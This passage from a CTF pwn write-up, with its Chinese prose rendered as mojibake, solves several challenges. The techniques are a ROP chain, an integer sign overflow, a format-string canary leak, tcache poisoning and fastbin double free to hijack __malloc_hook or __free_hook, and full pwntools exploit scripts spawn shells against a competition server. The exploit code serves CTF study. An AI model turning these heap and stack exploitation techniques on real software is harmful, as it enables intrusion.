0x000000000040101a read_addr = 0x4012CF gift = 0x00000000004011fb leave_ret = 0x000000000040131c add_rdi_40_ret = 0x00000000004011fe mov_rdi_rsp_ret = 0x0000000000401203 p.clean() payload = \\ b\u0026#34;./flag\\x00\\x00\u0026#34;*0x7 + \\ pg(pop_rdi_ret) + pg(0) + pg(mov_rsi_rdi_ret) +\\ pg(mov_rdi_rsp_ret) + pg(add_rdi_40_ret)*2 +\\ pg(pop_rax_syscall_ret) + pg(0x2) +\\ pg(mov_rsi_rdi_ret) +\\ pg(pop_rdi_ret) + pg(3) +\\ pg(pop_rdx_ret) + pg(0xff)+\\ pg(pop_rax_syscall_ret) + pg(0x0) +\\ pg(pop_rdi_ret) + pg(1) +\\ pg(pop_rax_syscall_ret) + pg(0x1) + pg(0) + b\u0026#34;./flag\\x00\\x00\u0026#34; p.sendline(payload) try: p.interactive() except: p.close() FLAGï¼šflag{6fU9jIyTmarX2EMwJHvQY7SpLuqVbzAN}\nCTF æŸ¥çœ‹æ¶æ„ï¼š\næœ‰ canary æŸ¥çœ‹ ida åç¼–è¯‘ä»£ç ï¼š\nè¿™é¢˜æœ‰ç‚¹å¯„çš„æ˜¯æ²¡æœ‰ main å‡½æ•°ï¼Œåªæœ‰ä¸€ä¸ª label1 ä½œä¸ºç¨‹åºå…¥å£ï¼Œæ‰€ä»¥åªèƒ½çœ‹æ±‡ç¼–ä»£ç ï¼Œå¥½åœ¨ä¸æ˜¯å¾ˆå¤æ‚ï¼š\nå¤§è‡´çš„é€»è¾‘æ˜¯è¦ç»è¿‡ä¸¤ä¸ªæŒ‘æˆ˜ï¼š\nç¬¬ä¸€ä¸ªæŒ‘æˆ˜æ˜¯ç»å…¸çš„é€Ÿç®—æŒ‘æˆ˜ï¼Œç”¨ python çš„ eval å‡½æ•°è§£æè¯»å…¥çš„è®¡ç®—å¼å°±å¯ä»¥äº†\nç¬¬äºŒä¸ªæŒ‘æˆ˜æ˜¯è¦åˆ©ç”¨ç¬¦å·ä½æ¼æ´ï¼Œæˆ‘ä»¬è¾“å…¥ 0x800000000000000c å³å¯\nè¿™é‡Œè¦æ³¨æ„çš„æ˜¯ï¼Œæˆ‘ä»¬ä¸èƒ½ç›´æ¥ç”¨ python è¾“å‡ºè¿™ä¸ªæ•°ï¼Œå› ä¸º python ä¼šè‡ªåŠ¨è§£æä¸ºå¾ˆå¤§çš„æ— ç¬¦å·æ•°ã€‚æ¯”è¾ƒç®€å•çš„æ–¹æ³•æ˜¯ä½¿ç”¨ Windows è‡ªå¸¦çš„è®¡ç®—å™¨ï¼š\nè¿˜æœ‰å¦å¤–ä¸€ç§æ–¹æ³•æ˜¯è°ƒç”¨ctypesåº“ï¼Œåˆ›å»ºlong long intç±»å‹çš„å˜é‡ï¼š\noverflow = ctypes.c_longlong(0x800000000000000c) # p.sendline(\u0026#34;-9223372036854775796\u0026#34;) p.sendline(str(overflow.value)) é€šè¿‡ç¬¬äºŒä¸ªæŒ‘æˆ˜åæˆ‘ä»¬å°±å¯ä»¥å¼€å§‹ç¬¬ä¸‰ä¸ªæŒ‘æˆ˜ã€‚ç¬¬ä¸‰ä¸ªæŒ‘æˆ˜æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ç”¨äºæ³„éœ² canaryï¼Œç„¶åå°±æ˜¯ä¸€ä¸ªæ ˆæº¢å‡ºã€‚\néœ€è¦æ³¨æ„çš„æ˜¯ï¼Œ64 ä½ç³»ç»Ÿä¸­çš„æ ¼å¼åŒ–å­—ç¬¦ä¸²çš„å‰äº”ä¸ªå‚æ•°åˆ†åˆ«å­˜åœ¨å¯„å­˜å™¨ RSI/RDX/RCX/R8/R9 ä¸­\nfrom pwn import * from pwn import p64, p32, u32, u64 from LibcSearcher import LibcSearcher from ctypes import c_longlong as longlong pss: bool = True fn: str = \u0026#34;./CTF\u0026#34; libc_name:str = \u0026#34;/lib/x86_64-linux-gnu/libc.so.6\u0026#34; port: str = \u0026#34;10074\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;43.248.98.206\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; b* $rebase(0x173B) c \u0026#34;\u0026#34;\u0026#34;) else: p = process(fn) # ä¸¤ä¸ªelfï¼Œæ³¨æ„libcçš„ç‰ˆæœ¬ m_elf = ELF(fn) # libc = ELF(libc_name) p.recvuntil(b\u0026#34;and tell you a secret \u0026#34;) getshell = int(p.recvuntil(b\u0026#34;\\n\u0026#34;)[:-1], 16) codebase = getshell - m_elf.sym[\u0026#39;getshell\u0026#39;] for i in range(50): p.recvuntil(b\u0026#34;num1:\u0026#34;) num1 = p.recvuntil(b\u0026#34;,num2:\u0026#34;)[:-6] num2 = p.recvuntil(b\u0026#34;\\n\u0026#34;)[:-1] p.recvuntil(b\u0026#34;operator:\u0026#34;) oper = p.recvuntil(b\u0026#34;\\n\u0026#34;)[:-1] if b\u0026#34;/\u0026#34; in oper: oper = b\u0026#34;//\u0026#34; answer = eval(num1 + oper + num2) p.clean() p.sendline(str(answer)) p.recvuntil(b\u0026#34;Great Job!\\n\u0026#34;) p.recvuntil(b\u0026#34;Your answer: \\n\u0026#34;) overflow = ctypes.c_longlong(0x800000000000000c) # p.sendline(\u0026#34;-9223372036854775796\u0026#34;) p.sendline(str(overflow.value)) p.recvuntil(b\u0026#34;Your answer: \\n\u0026#34;) p.sendline(str(1)) p.recvuntil(b\u0026#34;Your answer: \\n\u0026#34;) p.sendline(b\u0026#34;%25$p.\u0026#34;) p.recvuntil(b\u0026#34;0x\u0026#34;) canary = int(p.recvuntil(b\u0026#34;.\u0026#34;)[:-1], 16) for i in range(2): p.recvuntil(b\u0026#34;...\u0026#34;) p.recvuntil(b\u0026#34;Your answer: \\n\u0026#34;) payload = b\u0026#34;a\u0026#34;*0x88 + pg(canary) + pg(0) + pg(getshell) p.sendline(payload) p.recvuntil(\u0026#34;Quickly, you are surrounded.\\n\\n\u0026#34;) p.clean() p.interactive() FLAGï¼šflag{114514_V_me_F1fty}\nsignin æ³•ä¸€ï¼šfree å¤§ chunk ç»•è¿‡ tcache binï¼Œç„¶å tcache poison æ£€æŸ¥æ¶æ„ï¼š\næŸ¥çœ‹ ida ä¼ªä»£ç ï¼š\nè®¤çœŸåˆ†æä¸€ä¸‹å°±ä¼šå‘ç°è¿˜æ˜¯ç»å…¸çš„å †èœå•é¢˜\nå…ˆ free æ‰ä¸€ä¸ªå¾ˆå¤§çš„ chunkï¼Œè¿™æ ·è¿™ä¸ª chunk å°±ä¼šç›´æ¥è¿›å…¥ unsorted binï¼ˆè¿™ä¸ªä¸´ç•Œå€¼æˆ‘åœ¨è‡ªå·±çš„ 64 ä½æœºå™¨ä¸Šæµ‹è¯•ï¼Œå¤§æ¦‚æ˜¯ 0x409ï¼‰ï¼Œç„¶åå‡å» main_arena+96ï¼Œå°±å¯ä»¥å¾—åˆ° libc çš„åŸºå€\nå…³äºè¿™ä¸ª main_arena+96 å“ªé‡Œæ¥çš„ï¼Œé¦–å…ˆå°† libc æ‹–å…¥ idaï¼Œæœç´¢ malloc_trimï¼š\nmain_arena çš„åç§»å°±æ˜¯ 0x3ebc40\nç„¶åæˆ‘ä»¬ä½¿ç”¨ gdb æ‰‹åŠ¨ free ä¸€ä¸ªå¤§ chunkï¼ŒæŸ¥çœ‹å†…å­˜\nè¿™é‡Œ pwndbg å¯ä»¥ç”¨ bins å‘½ä»¤ï¼Œä½†æˆ‘çš„ bins å’Œ heap å‡ºç°é—®é¢˜å¯„äº†ï¼Œè¿™é‡Œæ¼”ç¤ºä¸€ä¸‹æ‰‹åŠ¨è®¡ç®— unsorted bin ä¸­åªæœ‰ä¸€ä¸ª chunk æ—¶å­˜å‚¨çš„å€¼å’Œ main_arena çš„åç§»ä¸ºä½•ä¸º 96\n0x00007ffff7dcdca0-0x7ffff79e2000-0x3ebc40=96\nä½¿ç”¨è®¡ç®—å™¨ä¼šå¿«å¾ˆå¤š\nç„¶åæˆ‘ä»¬ free æ‰ä¸€ä¸ªå° chunkï¼Œè®©ä»–è¿›å…¥ tcache binï¼Œæˆ‘ä»¬å°±èƒ½æ›´æ”¹å®ƒçš„ next ä½ï¼Œä»è€Œå¯ä»¥å®ç°ä»»æ„åœ°å€å†™\nè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æ›´æ”¹__malloc_hook çš„å€¼ä¸º one_gadget äº†\nfrom pwn import * from pwn import p64, p32, u32, u64 from LibcSearcher import LibcSearcher pss: bool = True fn: str = \u0026#34;./signin\u0026#34; libc_name:str = \u0026#34;./libc-2.27.so\u0026#34; port: str = \u0026#34;10071\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 ENV = {\u0026#34;LD_PRELOAD\u0026#34;:libc_name} context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p = remote(\u0026#34;43.248.98.206\u0026#34;, port) else: if if_debug: p = gdb.debug(fn, \u0026#34;\u0026#34;\u0026#34; b* 0x400904 \u0026#34;\u0026#34;\u0026#34;, env=ENV) else: p = process(fn, env=ENV) # ä¸¤ä¸ªelfï¼Œæ³¨æ„libcçš„ç‰ˆæœ¬ m_elf = ELF(fn) libc = ELF(libc_name) main_arena = 0x3EBC40 main_off = 96 chunks = 0x6020f0 # mallocçš„indexä¸èƒ½ç›´æ¥æ§åˆ¶ def allocate(size: int): p.clean() p.sendline(b\u0026#34;1\u0026#34;) p.clean() p.sendline(str(size)) # freeçš„æ ‡ç­¾å°äºä¸ƒ # ä¸€å…±åªèƒ½freeä¸¤æ¬¡ def free(index: int): p.clean() p.sendline(b\u0026#34;2\u0026#34;) p.clean() p.sendline(str(index)) def change(index: int, data: str): p.clean() p.sendline(b\u0026#34;3\u0026#34;) p.clean() p.sendline(str(index)) p.clean() p.sendline(data) def show(index: int): p.clean() p.sendline(b\u0026#34;4\u0026#34;) p.clean() p.sendline(str(index)) p.recvuntil(b\u0026#34;content: \u0026#34;) return p.recvuntil(b\u0026#34;\\n\u0026#34;)[:-1] allocate(0x1000) # 1 allocate(0x80) allocate(0x80) free(0) libcbase = u64(show(0)[:9].ljust(0x8, b\u0026#34;\\x00\u0026#34;)) - (main_arena + main_off) success(f\u0026#34;libcbase =\u0026gt; {hex(libcbase)}\u0026#34;) system_addr = libcbase + libc.sym[\u0026#39;system\u0026#39;] malloc_hook_addr = libcbase + libc.sym[\u0026#39;__malloc_hook\u0026#39;] one_gadget = libcbase + 0x10a2fc next_chunk = 0x23 free(1) payload = pg(malloc_hook_addr - next_chunk) change(1, payload) allocate(0x80) allocate(0x7f) # gdb.attach(p) payload = b\u0026#34;0\u0026#34;*0x23 + pg(one_gadget) change(4, payload) allocate(0x10) p.clean() p.interactive() FLAGï¼šflag{cd02sdyy9hfggsyo1wecd8ad2elttilnaj22}\næ³•äºŒï¼šé€šè¿‡stderræ³„éœ²libcï¼Œç„¶åæ›´æ”¹chunksæŒ‡é’ˆ è¿™ä¸ªæ–¹æ³•çš„è¦ç‚¹åœ¨äºï¼Œå› ä¸ºä½¿ç”¨äº†setbufå‡½æ•°ï¼Œæ‰€ä»¥stdinã€stdoutã€stderrä¼šä»¥å…¨å±€å˜é‡çš„å½¢å¼å­˜åœ¨ç¨‹åºä¸­ã€‚ æˆ‘ä»¬å¯ä»¥é€šè¿‡tcache poisoningæ¥å°†è¿™ä¸ªchunkåˆ†é…åˆ°è¿™ä¸ªåœ°æ–¹ï¼Œç„¶åå› ä¸ºç¨‹åºä¸­ä¿å­˜æ‰€æœ‰åˆ†é…ç©ºé—´çš„æŒ‡é’ˆchunksä¹Ÿæ˜¯å…¨å±€å˜é‡ï¼Œæ‰€ä»¥è¿™ä¸ªchunkä¹Ÿå¯ä»¥æ›´æ”¹chunksçš„å€¼ï¼Œè¿™æ ·å­å°±å¯ä»¥å°†å…¶æŒ‡å‘__malloc_hookï¼Œè¿™æ ·å­å°±èƒ½å¤Ÿå°†å®ƒçš„å€¼æ”¹ä¸ºone_gadgetäº†\nè¿™ä¸ªæ–¹æ³•æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯åˆ†é…åœ¨stderrå¤„çš„chunkä¼šå°†countç½®é›¶ï¼Œè¿™æ˜¯å› ä¸ºåˆ†é…çš„ä½ç½®åˆšå¥½è®©countåœ¨å®ƒçš„bkä½ï¼Œè€Œmallocä¼šå°†bkç½®é›¶ï¼š ^962996\nä¸”çœ‹ä¸‹é¢è¿™ä¸ªç¨‹åºï¼š\n#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;stdlib.h\u0026gt; int main(void){ int *a = (int *)malloc(0x80); int *b = (int *)malloc(0x80); free(a); a[2] = 1; a = (int *)malloc(0x80); printf(\u0026#34;%d\\n\u0026#34;, a[2]); } ç»“æœæ˜¯0ï¼š\nè‹¥å°†a[2]æ”¹ä¸ºa[1]ï¼Œåˆ™ç»“æœä¸º1ï¼š\nè¯´æ˜è‡³å°‘å¯¹tcache binä¸­çš„chunkæ¥è¯´ï¼Œbkä¼šè¢«ç½®é›¶è€Œfdä¸ä¼š\nè™½ç„¶è¿™å¯èƒ½ä¼šéšç€libcç‰ˆæœ¬çš„æ”¹å˜è€Œæ”¹å˜ï¼Œä½†æ˜¯å¦‚æœæˆ‘ä»¬åšé¢˜çš„æ—¶å€™å‘ç°bkè¢«ç½®é›¶äº†ï¼Œè‡³å°‘æˆ‘ä»¬å¤šäº†ä¸€ç§å¯è€ƒè™‘çš„å¯èƒ½\nfrom pwn import * path = \u0026#34;/home/linux/0/pwn/signin\u0026#34; stderr = 0x6020A0 context(log_level = \u0026#34;debug\u0026#34;, arch = \u0026#34;amd64\u0026#34;, os = \u0026#34;linux\u0026#34;) #p = process(path) #p = gdb.debug(path, \u0026#34;b *(main+0xC1)\u0026#34;) p = remote(\u0026#34;43.248.98.206\u0026#34;, \u0026#34;10071\u0026#34;) def add(size): p.sendlineafter(\u0026#34;choice: \u0026#34;, \u0026#34;1\u0026#34;)\tp.sendlineafter(\u0026#34;size: \u0026#34;, str(size)) def edit(index, content): p.sendlineafter(\u0026#34;choice: \u0026#34;, \u0026#34;3\u0026#34;) p.sendlineafter(\u0026#34;idx: \u0026#34;, str(index)) p.sendlineafter(\u0026#34;data: \u0026#34;, content) def display(index): p.sendlineafter(\u0026#34;choice: \u0026#34;, \u0026#34;4\u0026#34;) p.sendlineafter(\u0026#34;idx: \u0026#34;, str(index)) def free(index): p.sendlineafter(\u0026#34;choice: \u0026#34;, \u0026#34;2\u0026#34;) p.sendlineafter(\u0026#34;idx: \u0026#34;, str(index)) add(0x80) #0 add(0x80) #1 free(0) free(1) edit(1, p64(stderr)) #tcache poisoning add(0x80) #2 add(0x80) #0 0x6020A0 When mallocing chunk on 0x6020A0, the \u0026#34;idx\u0026#34; on .bss will change into 0. Actually I don\u0026#39;t know why. But the index of this chunk is 0. display(0) #leak libc p.recvuntil(\u0026#34;content: \u0026#34;) libc = int.from_bytes(p.recv(6), \u0026#34;little\u0026#34;) - 0x3EC680 print(\u0026#34;libc =\u0026#34;, hex(libc)) malloc_hook = libc + 0x3EBC30 print(\u0026#34;malloc_hook =\u0026#34;, hex(malloc_hook)) one_gadget = [libc + 0x4f302, libc + 0x10a2fc] edit(0, flat(0, 0, 0, 0, malloc_hook, 0x80)) #change the pointer save in chunks[0] into malloc_hook edit(0, flat(one_gadget[1])) #write one gadget add(0xA0) #trigger malloc_hook p.interactive() æ³•ä¸‰ï¼šæ›´æ”¹chanceåå°†__free_hookæ”¹ä¸ºsystemåœ°å€ï¼Œåœ¨chunkå†…å¡«å…¥/bin/shåfreeæ‰ libc-2.27.soé‡Šæ”¾ç¬¦åˆå¤§å°çš„å †å—ä¼šè¿›å…¥tcachebinä¸­\nä½†æ˜¯å› ä¸ºchanceçš„é™åˆ¶ï¼Œç¨‹åºè§„å®šåªèƒ½é‡Šæ”¾ä¸¤æ¬¡å †å—ï¼Œä½†åˆ©ç”¨tcachebinçš„ç‰¹æ€§å¯ä»¥æ”¹å˜é‡Šæ”¾æ¬¡æ•°\næ”¹å˜åå¯ä»¥é€šè¿‡å…ˆé‡Šæ”¾å¤§å †å—è¿›å…¥unsortedbinï¼Œåˆ©ç”¨å®ƒçš„ç‰¹æ€§å’ŒUAFå¸¦å‡ºmain_arenaï¼Œç„¶åé€šè¿‡å›ºå®šåç§»å¯ä»¥ç®—å‡ºlibcåŸºåœ°å€\nå†é‡Šæ”¾ä¸¤æ¬¡å †å—è¿›å…¥tcache binï¼Œæ”¹å˜é“¾é¦–éƒ¨çš„å †å—çš„fdæŒ‡å‘__free_hookï¼Œå†ç”³è¯·ä¸¤ä¸ªåŒæ ·å¤§å°çš„å †å—ï¼Œå†å°†__free_hooké‡Œçš„å€¼æ”¹ä¸ºsystemçš„ï¼Œæœ€åé€šè¿‡é‡Šæ”¾\u0026quot;/bin/sh\u0026quot;çš„å †å—å³å¯å®ç°system('/bin/sh')ï¼Œè¿˜æœ‰ä¸ªåœ°æ–¹å¾—æ³¨æ„ï¼Œåªèƒ½æ‰“å°8ä¸ªå †å—çš„å†…å®¹ï¼Œæ‰€ä»¥ç”³è¯·å †å—çš„æ•°é‡è¦æŠŠæ§å¥½\nfrom pwn import * context(log_level=\u0026#39;debug\u0026#39;,arch=\u0026#39;amd64\u0026#39;,os=\u0026#39;linux\u0026#39;) #p=process(\u0026#39;signin\u0026#39;) libc=ELF(\u0026#39;libc-2.27.so\u0026#39;) p=remote(\u0026#39;43.248.98.206\u0026#39;,10071) elf=ELF(\u0026#39;signin\u0026#39;) def add(size): p.sendlineafter(\u0026#39;choice: \u0026#39;,b\u0026#39;1\u0026#39;) p.sendlineafter(\u0026#39;size: \u0026#39;,str(size)) def free(index): p.sendlineafter(\u0026#39;choice: \u0026#39;,b\u0026#39;2\u0026#39;) p.sendlineafter(\u0026#39;idx: \u0026#39;,str(index)) def xiugai(index,data): p.sendlineafter(\u0026#39;choice: \u0026#39;,b\u0026#39;3\u0026#39;) p.sendlineafter(\u0026#39;idx: \u0026#39;,str(index)) p.sendafter(\u0026#39;data: \u0026#39;,data) def pri(index): p.sendlineafter(\u0026#39;choice: \u0026#39;,b\u0026#39;4\u0026#39;) p.sendlineafter(\u0026#39;idx: \u0026#39;,str(index)) add(16) add(16) free(0) free(1) payload=p64(0x602070) xiugai(1,payload) add(16) add(16) xiugai(3,b\u0026#39;100\u0026#39;) # å¢åŠ chanceæ¬¡æ•° add(0x500) # è¿›å…¥unsortedbin add(16) # é˜²æ­¢ä¸top_chunkç›¸è¿ free(4) pri(4) # å¸¦å‡ºmain_arenaåœ°å€ p.recvuntil(\u0026#39;content: \u0026#39;) libc_addr=u64(p.recv(6).ljust(8, b\u0026#39;\\x00\u0026#39;))-0x3ebca0 success(\u0026#39;libc:\u0026#39;+hex(libc_addr)) #gdb.attach(p) free(0) free(2) xiugai(2,p64(libc.symbols[\u0026#39;__free_hook\u0026#39;]+libc_addr)) add(16) add(16) xiugai(7,p64(libc.symbols[\u0026#39;system\u0026#39;]+libc_addr)) xiugai(6,b\u0026#39;/bin/sh\\x00\u0026#39;) free(6) #gdb.attach(p) p.interactive() LearnHeap æŸ¥çœ‹ç¨‹åºæ¶æ„ æŸ¥çœ‹idaåç¼–è¯‘ä»£ç  int __cdecl __noreturn main(int argc, const char **argv, const char **envp) { int ch_0; // [rsp+8h] [rbp-18h] BYREF int i; // [rsp+Ch] [rbp-14h] char *p; // [rsp+10h] [rbp-10h] unsigned __int64 v6; // [rsp+18h] [rbp-8h] v6 = __readfsqword(0x28u); init(); p = (char *)malloc(0x20uLL); puts(\u0026#34;Welcome to LearnHeap!\u0026#34;); puts(\u0026#34;This is a guided learning test.\u0026#34;); puts(\u0026#34;In this test, gdb and pwndbg may help you.\u0026#34;); puts(byte_176B); puts(\u0026#34;Now you will see a very regular heap question. add() show() delete()\u0026#34;); puts(\u0026#34;Step 1. Leak Libc address.\\nStep 2. double free.\\nStep 3. hijacking __free_hook\\nStep 4. get shell!\u0026#34;); puts(\u0026#34;Now, let\u0026#39;s start!\u0026#34;); Step1(); Step2(); Step3(); Step4(); *free_hook = 0LL; memset(p - 592, 0, 0x240uLL); for ( i = 67; i; --i ) malloc(0x10uLL); memset(book, 0, sizeof(book)); puts(\u0026#34;Now Let\u0026#39;s attack.\u0026#34;); while ( 1 ) { puts(\u0026#34;Welcome~!\\n1.add\\n2.show\\n3.delete\u0026#34;); printf(\u0026#34;\u0026gt; \u0026#34;); __isoc99_scanf(\u0026#34;%d\u0026#34;, \u0026amp;ch_0); switch ( ch_0 ) { case 2: show(); break; case 3: delete(); break; case 1: add(); break; default: puts(\u0026#34;error.\u0026#34;); break; } } } step1 æ³„éœ²libcåŸºå€ è¿™é‡Œè°ƒç”¨äº†addå’Œdeleteå‡½æ•°ï¼š å› æ­¤æˆ‘ä»¬ç¼–å†™çš„addå’Œdeleteå‡½æ•°:\ndef add(index: int, size: int, content, flag: bool = False): if flag: p.clean() p.sendline(b\u0026#34;1\u0026#34;) p.clean() p.sendline(str(index)) p.clean() p.sendline(str(size)) p.clean() p.sendline(content) def delete(index: int, flag: bool = False): if flag: p.clean() p.sendline(b\u0026#34;3\u0026#34;) p.clean() p.sendline(str(index)) ç„¶åæˆ‘ä»¬åˆ†é…ä¸€ä¸ªå¤§chunkè¿›å…¥unsorted binï¼Œè¿™æ ·å®ƒçš„fdæŒ‡é’ˆä¼šè¢«è®¾ä¸ºmain_arena+96ï¼Œä»è€Œæˆ‘ä»¬å¯ä»¥è·å¾—libcåŸºå€\néœ€è¦æ³¨æ„çš„æ˜¯ï¼Œè™½ç„¶æ²¡æœ‰showå‡½æ•°ï¼Œä½†æ˜¯åœ¨addå‡½æ•°çš„æœ€åä¼šå°†è¾“å…¥çš„å†…å®¹putså‡ºæ¥\nåˆå› ä¸ºmallocä¼šé¦–å…ˆä»å„ä¸ªbinä¸­å¯»æ‰¾åˆé€‚çš„chunkï¼Œæ‰€ä»¥æˆ‘ä»¬ç¬¬ä¸‰æ¬¡addçš„æ—¶å€™ä¼šåˆ†é…åˆ°è¿›å…¥unsorted binä¸­çš„é‚£ä¸ªå¤§chunkï¼ˆæˆ–å®ƒçš„ä¸€éƒ¨åˆ†ï¼‰ï¼Œè€Œmallocä¸ä¼šå°†å†…å®¹æ¸…é›¶ï¼ˆè‡³å°‘fdæŒ‡é’ˆä¸æ¸…é›¶ï¼Œè¯¦æƒ…è§æ­¤ï¼‰\næ‰€ä»¥ï¼Œæœ€åæˆ‘ä»¬putså‡ºæ¥çš„ï¼Œå°±æ˜¯main_arena+96çš„æŒ‡é’ˆ\næ³¨æ„ï¼Œlibc2.26æ²¡æœ‰tcache binï¼Œæ‰€ä»¥æ³¨æ„æƒ³è¦è¿›å…¥fastbinçš„chunkå¤§å°ï¼ˆé»˜è®¤æœ€å¤§å¤§å°ä¸º(64 * SIZE_SZ / 4)ï¼Œ32 ä½ä¸º 64=0x40 å­—èŠ‚ï¼Œ64 ä½ä¸º 128=0x80 å­—èŠ‚ï¼‰\nadd(0, 1071, b\u0026#34;\u0026#34;) # å¤§äº1072ä¼šé€€å‡ºï¼Œä½†æ˜¯1033å°±å¯ä»¥è¿›å…¥unsorted bin add(1, 0x10, b\u0026#34;\u0026#34;) delete(0) add(2, 0x10, b\u0026#34;\u0026#34;) p.recvuntil(b\u0026#34;Your book: \\n\u0026#34;) main_arena = 0x3dac20 main_off = 1002 libc_base = u64(p.recv(6).ljust(8, b\u0026#34;\\x00\u0026#34;)) - (main_arena + 1002) system_addr = libc_base + libc.sym[\u0026#39;system\u0026#39;] p.sendlineafter(\u0026#34;Let\u0026#39;s make a test.\\n\u0026#34;, hex(system_addr)) step2 double free æ„å»ºå¾ªç¯mallocé“¾ å› ä¸ºfastbinåœ¨libc2.26ä¸­å¯¹double freeçš„æ£€æŸ¥åªæ˜¯å•çº¯åœ°æ£€æŸ¥è¡¨å¤´çš„chunkæ˜¯å¦å’Œæ­£åœ¨freeçš„chunkä¸€æ ·ï¼Œæ‰€ä»¥åªè¦æˆ‘ä»¬åœ¨double freeä¸­é—´éšä¾¿freeä¸€ä¸ªåˆ«çš„chunkï¼Œå®ƒå°±æ£€æŸ¥ä¸åˆ°äº†ï¼ˆæ–°ç‰ˆæœ¬ä¸è¡Œï¼‰\nå¦‚æœæ˜¯2.27~2.28ä¸­çš„tcache binå°±æ›´å¥½åŠäº†ï¼Œå› ä¸ºå…¶æ ¹æœ¬æ²¡æœ‰ä»»ä½•æ£€æŸ¥ï¼Œç›´æ¥freeä¸¤æ¬¡å³å¯ è€Œå¦‚æœæ˜¯2.29~2.31ï¼Œtcache_entryå¢åŠ äº†ä¸€ä¸ªattributeï¼Œkeyå­—æ®µï¼Œè¦ä¹ˆæ›´æ”¹keyå­—æ®µç„¶ådouble freeï¼Œè¦ä¹ˆä½¿ç”¨fastbin double freeï¼Œè¯¦æƒ…è§æ­¤æ–‡ç« \nå¤§å¤šæ•°ç¨‹åºç»å¸¸ä¼šç”³è¯·ä»¥åŠé‡Šæ”¾ä¸€äº›æ¯”è¾ƒå°çš„å†…å­˜å—ã€‚å¦‚æœå°†ä¸€äº›è¾ƒå°çš„ chunk é‡Šæ”¾ä¹‹åå‘ç°å­˜åœ¨ä¸ä¹‹ç›¸é‚»çš„ç©ºé—²çš„ chunk å¹¶å°†å®ƒä»¬è¿›è¡Œåˆå¹¶ï¼Œé‚£ä¹ˆå½“ä¸‹ä¸€æ¬¡å†æ¬¡ç”³è¯·ç›¸åº”å¤§å°çš„ chunk æ—¶ï¼Œå°±éœ€è¦å¯¹ chunk è¿›è¡Œåˆ†å‰²ï¼Œè¿™æ ·å°±å¤§å¤§é™ä½äº†å †çš„åˆ©ç”¨æ•ˆç‡ã€‚å› ä¸ºæˆ‘ä»¬æŠŠå¤§éƒ¨åˆ†æ—¶é—´èŠ±åœ¨äº†åˆå¹¶ã€åˆ†å‰²ä»¥åŠä¸­é—´æ£€æŸ¥çš„è¿‡ç¨‹ä¸­ã€‚ å› æ­¤ï¼Œptmalloc ä¸­ä¸“é—¨è®¾è®¡äº† fast binï¼Œå¯¹åº”çš„å˜é‡å°±æ˜¯ malloc state ä¸­çš„ fastbinsY\néœ€è¦æ³¨æ„çš„æ˜¯ï¼Œèƒ½è¿›å…¥fastbinä¸­çš„chunkä¼šç›´æ¥è¿›å…¥fastbinï¼Œå°½ç®¡å®ƒå’Œtop chunkç›¸é‚»ä¹Ÿä¸ä¼šåˆå¹¶ï¼Œè§ctfwiki\ndelete(1) delete(2) delete(1) p.sendlineafter(\u0026#34;what sizes you make?\\n\u0026#34;, str(0x10)) step3 æ›´æ”¹fdæŒ‡é’ˆæŒ‡å‘free_hookï¼Œå¡«å…¥å±é™©å‡½æ•°åœ°å€ è¿™æ—¶æˆ‘ä»¬å› ä¸ºè·å¾—äº†ä¸€ä¸ªå¾ªç¯çš„mallocé“¾ï¼Œå¯ä»¥æ— é™åœ°mallocï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥åœ¨ç¬¬ä¸€æ¬¡addæ—¶æ›´æ”¹fdæŒ‡é’ˆï¼ŒæŒ‡å‘free_hookï¼Œç„¶åå°†å…¶æ”¹ä¸ºsystemçš„åœ°å€\næˆ‘ä»¬å°†\u0026quot;/bin/sh\u0026quot;å­˜åœ¨ä¸€ä¸ªchunkä¸­ï¼Œè‹¥__free_hookçš„å€¼æ”¹ä¸ºäº†systemï¼Œåˆ™åŸæœ¬çš„free(\u0026quot;/bin/sh\u0026quot;)å°±ä¼šäº§ç”Ÿsystem(\u0026quot;/bin/sh\u0026quot;)çš„æ•ˆæœ\nadd(3, 0x10, p64(m_elf.sym[\u0026#39;free_hook\u0026#39;])) add(4, 0x10, b\u0026#34;/bin/sh\\x00\u0026#34;) add(5, 0x10, b\u0026#34;a\u0026#34;) add(6, 0x10, p64(system_addr)) step4 getshell (fake) è¿™æ—¶å€™æˆ‘ä»¬delete(4)å°±å¯ä»¥äº†\ndelete(4) çœŸå®åœºæ™¯getshellï¼ å°±æ˜¯æŠŠä¸Šé¢çš„æ€è·¯å¤ç°ä¸€é\nä¸è¿‡ä¸åŒçš„æ˜¯æˆ‘ä»¬ä¸ç”¨leak libcäº†ï¼Œå› ä¸ºä¸Šé¢æˆ‘ä»¬å·²ç»è·å¾—äº†libcåŸºå€\nç›´æ¥æ„å»ºmallocé“¾ç„¶åfastbin attackå³å¯\n# flagè®¾ä¸ºTrue add(7, 0x10, b\u0026#34;\u0026#34;, True) add(8, 0x10, b\u0026#34;\u0026#34;, True) delete(7, True) delete(8, True) delete(7, True) add(9, 0x10, p64(libc.sym[\u0026#39;__free_hook\u0026#39;]+libc_base), True) add(10, 0x10, b\u0026#34;/bin/sh\\x00\u0026#34;, True) add(11, 0x10, b\u0026#34;a\u0026#34;, True) add(12, 0x10, p64(system_addr), True) delete(10, True) p.interactive() å®Œæ•´exp from pwn import * from pwn import p64, p32, u32, u64 from LibcSearcher import LibcSearcher pss: bool = False fn: str = \u0026#34;./learnheap\u0026#34; libc_name:str = \u0026#34;./libc-2.26.so\u0026#34; port: str = \u0026#34;10072\u0026#34; if_32: bool = False if_debug:bool = False pg = p32 if if_32 else p64 context(log_level=\u0026#34;debug\u0026#34;, arch=\u0026#34;i386\u0026#34; if if_32 else \u0026#34;amd64\u0026#34;, os=\u0026#34;linux\u0026#34;) if pss: p 